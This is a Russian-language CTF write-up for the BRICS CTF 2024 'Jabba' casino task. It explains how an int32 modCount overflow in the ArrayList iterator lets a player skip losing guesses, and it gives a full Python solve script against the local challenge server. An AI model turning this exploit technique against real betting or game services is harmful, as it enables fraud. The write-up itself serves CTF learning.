# Brics CTF Jabba task Write-Up

## Участники
- Озеров Ярослав  (empipment)
- Черкащенко Анастасия (ceresen)
- pl1ght

## Формулировка задания
Attention!

Melange harvesting on Tatooine is strictly prohibited.

Thank you for your attention!
(https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks/misc/medium-jabba)

## Решение
Необходимо организовать процесс таким образом, чтобы пропускать неудачные попытки (Guess.Loss) и обрабатывать только успешные (Guess.Win).

Основной подход основан на использовании внутреннего механизма ArrayList, где итератор проверяет соответствие счётчиков модификаций (modCount и expectedModCount). Поскольку эти счётчики имеют тип int32, при выполнении операций, достигающих значения INT.MAX_VALUE, происходит переполнение modCount, что позволяет обойти проверку на изменения коллекции.

Для реализации этого метода создаётся основной итератор, отвечающий за обработку только успешных попыток (successIterator). Когда итератор сталкивается с Guess.Win, он обрабатывает этот элемент напрямую. В случае обнаружения Guess.Loss инициируется временный итератор для его пропуска. После обработки неудачной попытки временный итератор закрывается, баланс обновляется, а счётчик модификаций основного итератора синхронизируется с текущим состоянием ArrayList. Таким образом, достигается обход стандартных проверок на изменения коллекции, позволяя фокусироваться исключительно на успешных попытках.

## Пример кода
```python
import sys
import subprocess
import requests
import websocket
from typing import List

DEFAULT_URL = 'localhost:7070'
API_BASE = f'http://{DEFAULT_URL}/api'
WS_BASE = f'ws://{DEFAULT_URL}/api'

CHUNK_SIZE = 10_000_000
MAX_INT = 2147483647

def execute_kotlin(seed: int, start: int, count: int) -> List[bool]:
    cmd = f'kotlin seed/SeedKt.class "{seed}" "{start}" "{count}"'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = proc.communicate()
    return [line.strip() == b'Win' for line in output.strip().splitlines()]

def register_user() -> requests.Session:
    session = requests.Session()
    response = session.post(f'{API_BASE}/user/register')
    response.raise_for_status()
    return session

def get_user_balance(session: requests.Session) -> int:
    response = session.get(f'{API_BASE}/user/balance')
    response.raise_for_status()
    return int(response.text)

def retrieve_flag(session: requests.Session) -> str:
    response = session.get(f'{API_BASE}/user/flag')
    return response.text

def initialize_game(session: requests.Session) -> int:
    response = session.post(f'{API_BASE}/casino/initialize')
    response.raise_for_status()
    return int(response.text)

def make_guess(session: requests.Session, amount: int) -> None:
    response = session.post(f'{API_BASE}/casino/guess', data=str(amount))
    response.raise_for_status()

def establish_ws_connection(session: requests.Session) -> websocket.WebSocket:
    token = session.cookies.get('token', '')
    ws_url = f'{WS_BASE}/casino/results'
    return websocket.create_connection(ws_url, cookie=f'token={token}')

def parse_ws_results(ws: websocket.WebSocket, count: int) -> dict:
    ws.send(str(count))
    data = ws.recv()
    if not data:
        raise ValueError("Empty response from WebSocket")
    parts = [part.split(': ') for part in data.split(', ')]
    return {key: int(value) for key, value in parts}

def simulate_consumption(target_length: int) -> int:
    total_consumed = 0
    target = 2 * MAX_INT + 2 - target_length

    for i in range(1 << 64):
        if i > 1:
            total_consumed += CHUNK_SIZE
        part = min(CHUNK_SIZE, target - total_consumed)
        total_consumed += part
        if total_consumed >= target:
            break

    return total_consumed

def sync_with_server(session: requests.Session, length: int, ping_ws) -> None:
    total = 0
    target = 2 * MAX_INT + 2 - length

    for i in range(1 << 64):
        ping_ws()
        if i > 1:
            ws = establish_ws_connection(session)
            parse_ws_results(ws, CHUNK_SIZE)
            ws.close()
            total += CHUNK_SIZE
            print(f'[sync] completed {total} / {target}')

        part = min(CHUNK_SIZE, target - total)
        make_guess(session, part)
        total += part

        if total >= target:
            break

    print('[sync] synchronization complete')

def locate_win(seed: int, start_pos: int, attempts: int = 1000) -> int:
    results = execute_kotlin(seed, start_pos, attempts)
    return results.index(True)

def skip_over_results(session: requests.Session, count: int) -> int:
    ws = establish_ws_connection(session)
    data = parse_ws_results(ws, count)
    ws.close()
    return data.get('wins', 0) + data.get('losses', 0)

def main_flow() -> None:
    total_coins = 10
    session = register_user()
    seed_value = initialize_game(session)
    print(f'Seed initialized: {seed_value}')

    ws_ping = establish_ws_connection(session)
    ping = lambda: ws_ping.ping("ping")

    current_start = 0

    for coin in range(total_coins):
        ping()
        print(f'Processing coin {coin + 1} of {total_coins}')

        size = 10_000
        skipped = skip_over_results(session, 1 << 28)
        sync_with_server(session, size + skipped, ping)
        consumed = simulate_consumption(size + skipped)
        current_start += consumed + skipped

        win_pos = locate_win(seed_value, current_start, size)
        skip_over_results(session, win_pos)
        current_start += win_pos

        make_guess(session, size - win_pos)
        result = parse_ws_results(ws_ping, 1)
        print(result)
        current_start += 1

    ws_ping.close()
    final_balance = get_user_balance(session)
    final_flag = retrieve_flag(session)

    print(f'Final balance: {final_balance} / {total_coins}')
    print(f'Flag: {final_flag}')

if __name__ == '__main__':
    target_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL
    main_flow()
```

